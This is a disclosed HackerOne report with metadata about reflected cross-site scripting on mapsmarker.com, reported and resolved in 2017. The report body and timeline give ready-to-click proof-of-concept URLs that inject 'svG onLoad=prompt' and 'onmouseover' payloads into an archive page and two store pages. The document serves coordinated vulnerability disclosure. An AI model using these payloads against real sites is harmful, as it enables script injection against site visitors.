---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-generic
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Generic"
enriched: true
body: true
date: 2017-07-02
submitted: 2017-06-02T16:44:21.806Z
bounty_usd: null
votes: 6
cve: []
program: "[[programs/mapsmarker_com_e_u|MapsMarker.com e.U.]]"
reporter: "paulochoupina"
source: "https://hackerone.com/reports/235866"
title: "Cross-site Scripting (XSS) in /updates-pro/archive/"
---
# Cross-site Scripting (XSS) in /updates-pro/archive/

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 6 | **Program:** MapsMarker.com e.U. | **Disclosed:** 2017-07-02

- Report: [https://hackerone.com/reports/235866](https://hackerone.com/reports/235866)
- CWE: Cross-site Scripting (XSS) - Generic
- Submitted: 2017-06-02T16:44:21.806Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hey guys.
The dir parameter on /updates-pro/archive/ seems to be vulnerable to Cross-site Scripting.

Steps to reproduce:
1- Navigate to: https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1
2- Add this to the url: <svG onLoad=prompt(9)>
3- Result in attached printsceen.

Or quite simple visit:
https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1%3CsvG%20onLoad=prompt(1)%3E

## Timeline

- **Report Filed**
- **2017-06-02** @paulochoupina: Another Cross-site Scripting (XSS) in:

https://www.mapsmarker.com/store/customers/index.php/x'/onmouseover=prompt(9)/', x'><svG onLoad=prompt(9)>, x' onmouseover=prompt(9) '/?task=login

Printscreen attached.
- **2017-06-02** @paulochoupina: This way is better for you to just click in it:
https://www.mapsmarker.com/store/customers/index.php/x'/onmouseover=prompt(9)/',%20x'%3E%3CsvG%20onLoad=prompt(9)%3E,%20x'%20onmouseover=prompt(9)%20'/?task=login
- **2017-06-02** @paulochoupina: 3º one:
https://www.mapsmarker.com/store/order/index.php/x'/onmouseover=prompt(9)/', x'><svG onLoad=prompt(9)>, x' onmouseover=prompt(9) '/?task=product&product_id=1&category_id=1

https://www.mapsmarker.com/store/order/index.php/x'/onmouseover=prompt(9)/',%20x'%3E%3CsvG%20onLoad=prompt(9)%3E,%20x'%20onmouseover=prompt(9)%20'/?task=product&product_id=1&category_id=1
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **2017-06-03** @mapsmarker: █████████
- **Report Became Public**
- **Comments Closed**
